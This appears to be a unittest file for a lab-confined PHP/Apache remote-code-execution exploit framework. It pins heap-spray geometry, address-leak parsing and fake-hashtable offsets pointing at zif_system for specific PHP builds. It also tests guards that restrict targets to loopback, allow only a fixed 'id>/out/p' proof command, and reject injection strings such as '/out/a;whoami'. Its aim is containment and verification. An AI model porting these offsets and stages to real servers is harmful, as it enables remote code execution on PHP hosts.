from __future__ import annotations

import json
import hashlib
import importlib.util
import argparse
import socket
import struct
import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from elf import inspect_elf, verify_elf_against_profile  # noqa: E402
from exploit import LabExploit, resolve_lab_target  # noqa: E402
from php81_trans_sid import Php81TransSidExploit, _http_body  # noqa: E402
from pure_http_oom import PureHttpOomExploit  # noqa: E402
from profile import (  # noqa: E402
    ProfileError,
    load_profile,
    parse_hex,
    require_verified,
    safe_proof_command,
    validate_profile,
    validate_target_manifest,
)
from profile_tool import command_calibrate, command_manifest  # noqa: E402


PROFILE_PATH = ROOT / "profiles" / "php-8.4.26-apache-amd64-fixed.json"
PHP81_PROFILE_PATH = ROOT / "profiles" / "php-8.1.34-apache-amd64-trans-sid.json"
PURE_PROFILE_PATH = ROOT / "profiles" / "php-8.2.34-apache-amd64-pure-http-oom.json"


class ProfileTests(unittest.TestCase):
    def setUp(self) -> None:
        self.profile = load_profile(PROFILE_PATH)

    def test_verified_profile_loads(self) -> None:
        require_verified(self.profile)
        self.assertEqual(self.profile.strategy, "fixed-carrier-v1")

    def test_session_rewrite_runtime_keys_are_optional_for_older_strategies(self) -> None:
        data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
        data["runtime"].update({
            "session_use_trans_sid": False,
            "session_use_cookies": True,
            "session_use_only_cookies": True,
            "upload_progress_cleanup": True,
            "url_rewriter_tags": "a=href",
        })
        validate_profile(data)

    def test_candidate_refuses_execution(self) -> None:
        data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
        data["verification"] = {
            "state": "candidate",
            "runs": 0,
            "proof": "not-yet-verified",
            "verified_at": None,
        }
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "candidate.json"
            path.write_text(json.dumps(data), encoding="utf-8")
            with self.assertRaisesRegex(ProfileError, "only locally verified"):
                require_verified(load_profile(path))

    def test_unknown_profile_key_rejected(self) -> None:
        data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
        data["numeric_override"] = 1
        with self.assertRaisesRegex(ProfileError, "unknown numeric_override"):
            validate_profile(data)

    def test_safe_proof_command(self) -> None:
        self.assertEqual(safe_proof_command("/out/p"), b"id>/out/p")
        for bad in ("/tmp/p", "/out/a;whoami", "/out/a b", "/out/../p"):
            with self.subTest(bad=bad), self.assertRaises(ProfileError):
                safe_proof_command(bad)

    def test_manifest_is_short_lived_and_exact(self) -> None:
        now = datetime.now(timezone.utc).replace(microsecond=0)
        image = self.profile.raw["build"]["image"]
        manifest = {
            "schema_version": 1,
            "profile_id": self.profile.id,
            "profile_sha256": self.profile.file_sha256,
            "created_at": (now - timedelta(seconds=1)).isoformat().replace("+00:00", "Z"),
            "expires_at": (now + timedelta(minutes=5)).isoformat().replace("+00:00", "Z"),
            "image": dict(image),
            "libphp_sha256": self.profile.raw["build"]["libphp"]["sha256"],
            "runtime": dict(self.profile.raw["runtime"]),
            "resolved_addresses": ["127.0.0.1"],
        }
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "manifest.json"
            path.write_text(json.dumps(manifest), encoding="utf-8")
            loaded = validate_target_manifest(self.profile, path)
            self.assertEqual(tuple(loaded["resolved_addresses"]), ("127.0.0.1",))
            manifest["libphp_sha256"] = "0" * 64
            path.write_text(json.dumps(manifest), encoding="utf-8")
            with self.assertRaisesRegex(ProfileError, "libphp hash mismatch"):
                validate_target_manifest(self.profile, path)

    def test_r0_geometry_candidate_validates(self) -> None:
        data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
        data["verification"] = {
            "state": "candidate",
            "runs": 0,
            "proof": "not-yet-verified",
            "verified_at": None,
        }
        data["id"] = "php-8.4.26-r0-candidate"
        data["request_recipe"]["stage3"] = {
            "strategy": "r0-spray-v1",
            "trigger_pads": 32,
            "r0_search": {
                "page_lo": "0x50000",
                "page_hi_exclusive": "0xc0000",
                "page_step": "0x1000",
                "lowbits": ["0x160", "0x100", "0x130", "0x190"],
                "releak_every": 24,
            },
            "spray": {"value_len": 4071, "count": 400, "ht_page_offset": "0x800"},
            "pre_session_fields": {"count": 0, "value_len": 19, "name_prefix": "s"},
        }
        validate_profile(data)

    def test_adaptive_stage2_and_pre_session_bounds(self) -> None:
        data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
        data["request_recipe"]["stage2"] = {
            "strategy": "adaptive-window-v1",
            "window": "0x20000",
            "arrays": 150,
        }
        data["request_recipe"]["stage3"] = {
            "strategy": "r0-spray-v1",
            "trigger_pads": 32,
            "r0_search": {
                "page_lo": "0x73000",
                "page_hi_exclusive": "0x74000",
                "page_step": "0x1000",
                "lowbits": ["0x180"],
                "releak_every": 24,
            },
            "spray": {"value_len": 4071, "count": 128, "ht_page_offset": "0x800"},
            "pre_session_fields": {"count": 1, "value_len": 19, "name_prefix": "s"},
        }
        validate_profile(data)

        bad = json.loads(json.dumps(data))
        bad["request_recipe"]["stage2"]["window"] = "0x21001"
        with self.assertRaisesRegex(ProfileError, "page-aligned"):
            validate_profile(bad)
        bad = json.loads(json.dumps(data))
        bad["request_recipe"]["stage3"]["pre_session_fields"]["count"] = 128
        with self.assertRaisesRegex(ProfileError, "below spray.count"):
            validate_profile(bad)

    def test_fixed_payload_matches_verified_reference(self) -> None:
        reference_path = ROOT.parents[1] / "cozybear-wsl" / "attacker" / "exploit.py"
        if not reference_path.exists():
            self.skipTest("verified reference implementation is absent")
        spec = importlib.util.spec_from_file_location("verified_reference", reference_path)
        assert spec is not None and spec.loader is not None
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        old = module.Exploit.__new__(module.Exploit)
        old.cmd = b"id>/out/p"
        expected, _unused_reference = old._payload(0x7000000690D8, 0x700100465370)
        current = LabExploit(None, self.profile, b"id>/out/p")
        actual = current._fake_hashtable(0x7000000690D8, 0x700100465370)
        self.assertEqual(actual, expected)

    def test_candidate_calibration_stays_candidate(self) -> None:
        data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
        data["verification"] = {
            "state": "candidate",
            "runs": 0,
            "proof": "not-yet-verified",
            "verified_at": None,
        }
        data["id"] = "calibration-input"
        with tempfile.TemporaryDirectory() as directory:
            source = Path(directory) / "input.json"
            output = Path(directory) / "output.json"
            source.write_text(json.dumps(data), encoding="utf-8")
            args = argparse.Namespace(
                profile=str(source), output=str(output), id="calibration-output",
                stage1_fillers=842, stage2_fillers=None, stage2_target=None,
                stage2_target_count=None, stage2_value_len=None,
                fixed_htdata_offset="0x690e0", r0_page_lo=None, r0_page_hi=None,
                r0_page_step=None, r0_lowbits=None, r0_releak_every=None,
            )
            self.assertEqual(command_calibrate(args), 0)
            calibrated = load_profile(output)
            self.assertEqual(calibrated.raw["verification"]["state"], "candidate")
            self.assertEqual(calibrated.raw["request_recipe"]["stage1"]["fillers"], 842)
            self.assertEqual(calibrated.raw["request_recipe"]["stage3"]["htdata_offset"], "0x690e0")

    def test_manifest_tool_with_exact_local_evidence(self) -> None:
        module = ROOT.parent / "legacy" / "bin" / "libphp-8.4.26.so"
        if not module.exists():
            self.skipTest("local extracted reference module is absent")
        with tempfile.TemporaryDirectory() as directory:
            runtime_path = Path(directory) / "runtime.json"
            output = Path(directory) / "manifest.json"
            runtime_path.write_text(
                json.dumps(dict(self.profile.raw["runtime"])), encoding="utf-8"
            )
            image = self.profile.raw["build"]["image"]
            args = argparse.Namespace(
                profile=str(PROFILE_PATH), libphp=str(module),
                runtime_json=str(runtime_path), image_id=image["image_id"],
                repo_digest=image["repo_digest"], address=["127.0.0.1"],
                minutes=5, output=str(output),
            )
            self.assertEqual(command_manifest(args), 0)
            manifest = validate_target_manifest(self.profile, output)
            self.assertEqual(tuple(manifest["resolved_addresses"]), ("127.0.0.1",))


class GuardTests(unittest.TestCase):
    def test_literal_loopback_accepted(self) -> None:
        self.assertEqual(resolve_lab_target("127.0.0.1", 80), ("127.0.0.1",))

    def test_public_literal_rejected(self) -> None:
        with self.assertRaisesRegex(ProfileError, "non-lab address"):
            resolve_lab_target("8.8.8.8", 80)

    def test_mixed_dns_rejected(self) -> None:
        answers = [
            (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("172.20.0.2", 80)),
            (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("203.0.113.2", 80)),
        ]
        with mock.patch("socket.getaddrinfo", return_value=answers):
            with self.assertRaisesRegex(ProfileError, "non-lab address"):
                resolve_lab_target("mixed.invalid", 80)


class PureHttpOomProfileTests(unittest.TestCase):
    def setUp(self) -> None:
        self.profile = load_profile(PURE_PROFILE_PATH)

    def test_complete_profile_is_verified(self) -> None:
        self.assertEqual(self.profile.strategy, "pure-http-oom-v1")
        self.assertEqual(self.profile.raw["request_recipe"]["b2"]["fake_array_offset"], "0xf9398")
        require_verified(self.profile)

    def test_candidate_copy_still_fails_closed(self) -> None:
        data = json.loads(PURE_PROFILE_PATH.read_text(encoding="utf-8"))
        data["verification"] = {
            "state": "candidate",
            "runs": 0,
            "proof": "test-only-candidate",
            "verified_at": None,
        }
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "candidate.json"
            path.write_text(json.dumps(data), encoding="utf-8")
            with self.assertRaisesRegex(ProfileError, "only locally verified"):
                require_verified(load_profile(path))

    def test_display_mode_and_input_bounds_fail_closed(self) -> None:
        data = json.loads(PURE_PROFILE_PATH.read_text(encoding="utf-8"))
        data["runtime"]["display_errors"] = True
        with self.assertRaisesRegex(ProfileError, "must be false"):
            validate_profile(data)
        data = json.loads(PURE_PROFILE_PATH.read_text(encoding="utf-8"))
        data["request_recipe"]["b2"]["after_fields"] = 498
        with self.assertRaisesRegex(ProfileError, "max_input_vars"):
            validate_profile(data)

    def test_a1_uses_tail_variant_and_fixed_query(self) -> None:
        engine = PureHttpOomExploit(mock.Mock(), self.profile, b"id>/out/p")
        body, boundary, query = engine.build_a1()
        self.assertEqual(len(boundary), 70)
        self.assertEqual(
            query,
            "q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v",
        )
        self.assertIn(b'name="PHP_SESSION_UPLOAD_PROGRESS"', body)
        self.assertIn(b'name="t00' + b"t" * 32 + b'"', body)
        self.assertTrue(body.endswith(b"--" + boundary + b"--\r\n"))
        self.assertEqual(len(body), 1_117_868)
        self.assertEqual(
            hashlib.sha256(body).hexdigest(),
            "643be7a49073fc4af53a2d87aec3ec4b7f67fade1f0d458d00c6f88675326178",
        )

    def test_b1_forge_uses_raw_chunk_offset(self) -> None:
        engine = PureHttpOomExploit(mock.Mock(), self.profile, b"id>/out/p")
        value = engine._forge_large_value(400, 8)
        header = 0xE2968 - 0x1018
        self.assertEqual(struct.unpack_from("<Q", value, header + 0x10)[0], 0xC8000)
        self.assertEqual(value[header + 0x18:header + 0x20], b"/08BBBBB")

    def test_b2_is_fixed_command_and_profile_geometry(self) -> None:
        engine = PureHttpOomExploit(mock.Mock(), self.profile, b"id>/out/p")
        main = 0x700000000000
        libphp = 0x700100000000
        body, boundary = engine.build_b2(main, libphp)
        self.assertEqual(boundary, b"C" * 10)
        self.assertIn(b"id>/out/p", body)
        self.assertEqual(body.count(b'Content-Disposition: form-data; name="'), 998)
        first = body.index(b"\r\n\r\n") + 4
        table = main + 0xF9398
        self.assertEqual(struct.unpack_from("<I", body, first + 8)[0], 1)
        self.assertEqual(struct.unpack_from("<I", body, first + 12)[0], 0xA)
        self.assertEqual(struct.unpack_from("<Q", body, first + 16)[0], table)
        ht = body.index(b'name="ht"\r\n\r\n') + len(b'name="ht"\r\n\r\n')
        self.assertEqual(struct.unpack_from("<Q", body, ht + 0x10)[0], table + 0x20)
        self.assertEqual(struct.unpack_from("<Q", body, ht + 0x30)[0], libphp + 0x39B8A0)
        self.assertEqual(body[ht + 0x98:ht + 0x98 + 9], b"id>/out/p")
        with self.assertRaisesRegex(ProfileError, "fixed uid proof"):
            PureHttpOomExploit(mock.Mock(), self.profile, b"uname -a")


class Php81TransSidProfileTests(unittest.TestCase):
    def setUp(self) -> None:
        self.profile = load_profile(PHP81_PROFILE_PATH)

    def test_complete_profile_is_verified_and_exact(self) -> None:
        require_verified(self.profile)
        self.assertEqual(self.profile.strategy, "php81-trans-sid-v1")
        self.assertEqual(self.profile.raw["build"]["php"]["version"], "8.1.34")
        self.assertEqual(self.profile.raw["runtime"]["memory_limit"], "128M")
        self.assertEqual(self.profile.raw["runtime"]["post_max_size"], "192M")
        self.assertIs(self.profile.raw["runtime"]["session_use_trans_sid"], True)
        self.assertIs(self.profile.raw["runtime"]["session_use_cookies"], False)
        self.assertIs(self.profile.raw["runtime"]["session_use_only_cookies"], False)
        self.assertIs(self.profile.raw["runtime"]["upload_progress_cleanup"], True)
        self.assertEqual(
            self.profile.raw["runtime"]["url_rewriter_tags"],
            "a=href,area=href,frame=src,form=",
        )
        self.assertEqual(self.profile.hx("symbols", "zif_system", "offset"), 0x36F470)
        self.assertEqual(self.profile.hx("symbols", "zval_ptr_dtor", "offset"), 0x457150)

    def test_runtime_and_reclaim_geometry_fail_closed(self) -> None:
        data = json.loads(PHP81_PROFILE_PATH.read_text(encoding="utf-8"))
        data["runtime"]["memory_limit"] = "129M"
        with self.assertRaisesRegex(ProfileError, "exact 128M/192M/192M/1000 runtime"):
            validate_profile(data)

        data = json.loads(PHP81_PROFILE_PATH.read_text(encoding="utf-8"))
        data["request_recipe"]["b2"]["fake_array_offset"] = "0x75800"
        with self.assertRaisesRegex(ProfileError, "share one reclaim page"):
            validate_profile(data)

        bad_runtime_values = {
            "session_use_trans_sid": False,
            "session_use_cookies": True,
            "session_use_only_cookies": True,
            "upload_progress_cleanup": False,
            "url_rewriter_tags": "a=href",
        }
        for key, value in bad_runtime_values.items():
            with self.subTest(runtime_key=key):
                data = json.loads(PHP81_PROFILE_PATH.read_text(encoding="utf-8"))
                data["runtime"][key] = value
                with self.assertRaises(ProfileError):
                    validate_profile(data)

        data = json.loads(PHP81_PROFILE_PATH.read_text(encoding="utf-8"))
        del data["runtime"]["session_use_trans_sid"]
        with self.assertRaisesRegex(ProfileError, "missing session_use_trans_sid"):
            validate_profile(data)

    def test_http_response_framing_fails_closed(self) -> None:
        self.assertEqual(
            _http_body(b"HTTP/1.1 200 OK\r\nContent-Length: 3\r\n\r\nabc"),
            b"abc",
        )
        with self.assertRaisesRegex(ProfileError, "truncated or overlong"):
            _http_body(b"HTTP/1.1 200 OK\r\nContent-Length: 4\r\n\r\nabc")

        chunked = (
            b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n"
            b"3\r\nabc\r\n0\r\n\r\n"
        )
        self.assertEqual(_http_body(chunked), b"abc")
        trailer = (
            b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n"
            b"3\r\nabc\r\n0\r\nX-Trace: local\r\n\r\n"
        )
        self.assertEqual(_http_body(trailer), b"abc")

        with self.assertRaisesRegex(ProfileError, "truncated or overlong HTTP trailer"):
            _http_body(chunked[:-2])
        with self.assertRaisesRegex(ProfileError, "truncated or overlong HTTP trailer"):
            _http_body(chunked + b"trailing")

        rejected = (
            (
                "unsupported transfer coding",
                b"HTTP/1.1 200 OK\r\n"
                b"Transfer-Encoding: gzip, chunked\r\n\r\nabc",
            ),
            (
                "malformed transfer coding",
                b"HTTP/1.1 200 OK\r\nTransfer-Encoding: \r\n\r\nabc",
            ),
            (
                "duplicate transfer coding",
                b"HTTP/1.1 200 OK\r\n"
                b"Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n"
                b"3\r\nabc\r\n0\r\n\r\n",
            ),
            (
                "malformed content length",
                b"HTTP/1.1 200 OK\r\nContent-Length: nope\r\n\r\nabc",
            ),
        )
        for reason, response in rejected:
            with self.subTest(reason=reason):
                with self.assertRaises(ProfileError):
                    _http_body(response)

    def test_a1_and_b1_match_the_validated_request_bytes(self) -> None:
        engine = Php81TransSidExploit(mock.Mock(), self.profile, b"id>/out/p")
        expected_query = "q0=v&q1=v&q2=v&q3=v&q4=v"

        a1, boundary, query = engine.build_a1()
        self.assertEqual(boundary, b"C" * 10)
        self.assertEqual(query, expected_query)
        self.assertEqual(len(a1), 972_437)
        self.assertEqual(
            hashlib.sha256(a1).hexdigest(),
            "eb33ea00b03282d1a5f726f3ef7ce13522dcf2ea2112ec77c33575169d94222b",
        )

        b1, boundary, query = engine.build_b1()
        self.assertEqual(boundary, b"C" * 10)
        self.assertEqual(query, expected_query)
        self.assertEqual(len(b1), 33_128_677)
        self.assertEqual(
            hashlib.sha256(b1).hexdigest(),
            "bc129aff810e30a2108f94da1d0f58d4dccddb324d904bb349ecaa73256b493e",
        )

    def test_b1_parser_requires_both_profiled_fingerprints(self) -> None:
        engine = Php81TransSidExploit(mock.Mock(), self.profile, b"id>/out/p")
        spec = self.profile.raw["request_recipe"]["b1"]
        leak = bytearray(parse_hex(spec["fake_len"], "b1.fake_len"))
        leak[:8] = b"/14BBBBB"
        main = 0x700000000000
        libphp = main + 0x1C00000
        dtor = libphp + 0x457150
        struct.pack_into("<Q", leak, parse_hex(spec["main_qword_offset"], "b1.main_qword_offset"), main + 0x40)
        for index in range(101):
            struct.pack_into("<Q", leak, 0x10000 + index * 8, dtor)

        disclosure = engine.parse_b1_leak(bytes(leak))
        self.assertEqual(disclosure.main_chunk, main)
        self.assertEqual(disclosure.libphp_base, libphp)
        self.assertEqual(disclosure.zval_ptr_dtor, dtor)
        self.assertEqual(disclosure.dtor_hits, 101)

        leak[0] = ord("!")
        with self.assertRaisesRegex(ProfileError, "hit tag"):
            engine.parse_b1_leak(bytes(leak))

        leak[0] = ord("/")
        short = bytes(leak[: parse_hex(spec["fake_len"], "b1.fake_len") - 8])
        with self.assertRaisesRegex(ProfileError, "disclosure length"):
            engine.parse_b1_leak(short)

        weak = bytearray(parse_hex(spec["fake_len"], "b1.fake_len"))
        weak[:8] = b"/14BBBBB"
        struct.pack_into(
            "<Q",
            weak,
            parse_hex(spec["main_qword_offset"], "b1.main_qword_offset"),
            main + 0x40,
        )
        for index in range(99):
            struct.pack_into("<Q", weak, 0x10000 + index * 8, dtor)
        with self.assertRaisesRegex(ProfileError, "fingerprint is not unique"):
            engine.parse_b1_leak(bytes(weak))

        ambiguous = bytearray(weak)
        for index in range(100):
            struct.pack_into("<Q", ambiguous, 0x20000 + index * 8, dtor + 0x1000)
        for index in range(101):
            struct.pack_into("<Q", ambiguous, 0x10000 + index * 8, dtor)
        with self.assertRaisesRegex(ProfileError, "fingerprint is not unique"):
            engine.parse_b1_leak(bytes(ambiguous))

    def test_a2_stream_and_b2_are_fixed_to_profile(self) -> None:
        engine = Php81TransSidExploit(mock.Mock(), self.profile, b"id>/out/p")
        chunks, boundary = engine.build_a2()
        lengths = [len(chunk) for chunk in chunks]
        self.assertEqual(boundary, b"S" * 17)
        self.assertEqual(sum(lengths), 167_775_191)
        self.assertLessEqual(max(lengths), 65_536)

        main = 0x700000000000
        libphp = main + 0x1C00000
        body, boundary = engine.build_b2(main, libphp)
        self.assertEqual(boundary, b"B" * 10)
        self.assertEqual(body.count(b'Content-Disposition: form-data; name="'), 402)
        first = body.index(b'name="s000"\r\n\r\n') + len(b'name="s000"\r\n\r\n')
        reference = 0x160 - 0x18
        fake_array = 0x800 - 0x18
        self.assertEqual(struct.unpack_from("<I", body, first + reference)[0], 1)
        self.assertEqual(struct.unpack_from("<I", body, first + reference + 4)[0], 0xA)
        self.assertEqual(
            struct.unpack_from("<Q", body, first + fake_array + 0x30)[0],
            libphp + 0x36F470,
        )
        self.assertEqual(
            body[first + fake_array + 0x98:first + fake_array + 0x98 + 9],
            b"id>/out/p",
        )
        with self.assertRaisesRegex(ProfileError, "accepts only id>/out/p"):
            Php81TransSidExploit(mock.Mock(), self.profile, b"uname -a")


class RecipeTests(unittest.TestCase):
    class RecordingTarget:
        def __init__(self) -> None:
            self.posts = []

        def log(self, _message: str) -> None:
            pass

        def post(self, body, boundary, **kwargs):
            self.posts.append((body, boundary, kwargs))
            return b""

    def _r0_profile(self):
        data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
        data["request_recipe"]["stage2"] = {
            "strategy": "adaptive-window-v1",
            "window": "0x20000",
            "arrays": 150,
        }
        data["request_recipe"]["stage3"] = {
            "strategy": "r0-spray-v1",
            "trigger_pads": 32,
            "r0_search": {
                "page_lo": "0x73000",
                "page_hi_exclusive": "0x74000",
                "page_step": "0x1000",
                "lowbits": ["0x180"],
                "releak_every": 24,
            },
            "spray": {"value_len": 4071, "count": 128, "ht_page_offset": "0x800"},
            "pre_session_fields": {"count": 1, "value_len": 19, "name_prefix": "s"},
        }
        validate_profile(data)
        profile = mock.Mock()
        profile.raw = data
        profile.strategy = "r0-spray-v1"
        return profile

    def test_r0_consumer_orders_pre_session_field_before_specials(self) -> None:
        target = self.RecordingTarget()
        exploit = LabExploit(target, self._r0_profile(), b"id>/out/p")
        with mock.patch.object(exploit, "_r0_trigger"), mock.patch.object(
            exploit, "_packed_r0_value", return_value=b"SPRAY"
        ):
            exploit.r0_stage3(0x700000000000, 0x700100000000, 0x73000, [0x180])
        body = target.posts[-1][0]
        positions = [
            body.index(b'name="s000"'),
            body.index(b'name="PHPSESSID"'),
            body.index(b'name="PHP_SESSION_UPLOAD_PROGRESS"'),
            body.index(b'name="s001"'),
        ]
        self.assertEqual(positions, sorted(positions))
        self.assertIn(b'name="s000"\r\n\r\n' + b"F" * 19 + b"\r\n", body)
        self.assertEqual(body.count(b'name="s'), 128)

    def test_adaptive_stage2_uses_profiled_window_and_arrays(self) -> None:
        target = self.RecordingTarget()
        exploit = LabExploit(target, self._r0_profile(), b"id>/out/p")
        with mock.patch("exploit.time.sleep"):
            exploit.stage2()
        self.assertEqual(len(target.posts), 2)
        body = target.posts[1][0]
        self.assertIn(struct.pack("<Q", 0x20000), body)
        self.assertEqual(body.count(b'name="a'), 150)
        self.assertLess(body.index(b'name="1999"'), body.index(b'name="a0000[0]"'))

    def test_adaptive_stage2_keeps_stage1_worker_state(self) -> None:
        exploit = LabExploit(self.RecordingTarget(), self._r0_profile(), b"id>/out/p")
        events = []
        exploit.rotate = lambda: events.append("rotate")
        exploit.stage1 = lambda: (events.append("stage1") or (0x700000000000, b""))
        exploit.stage2 = lambda: (events.append("stage2") or (0x700100000000, b""))
        exploit.leak_addresses(1)
        self.assertEqual(events, ["rotate", "stage1", "stage2"])


class ElfTests(unittest.TestCase):
    def test_known_module_when_present(self) -> None:
        module = ROOT.parent / "legacy" / "bin" / "libphp-8.4.26.so"
        if not module.exists():
            self.skipTest("local extracted reference module is absent")
        metadata = inspect_elf(module)
        self.assertEqual(metadata.symbols["zif_system"], 0x465370)
        self.assertEqual(metadata.symbols["zval_ptr_dtor"], 0x65EB60)
        verify_elf_against_profile(module, load_profile(PROFILE_PATH))


if __name__ == "__main__":
    unittest.main(verbosity=2)

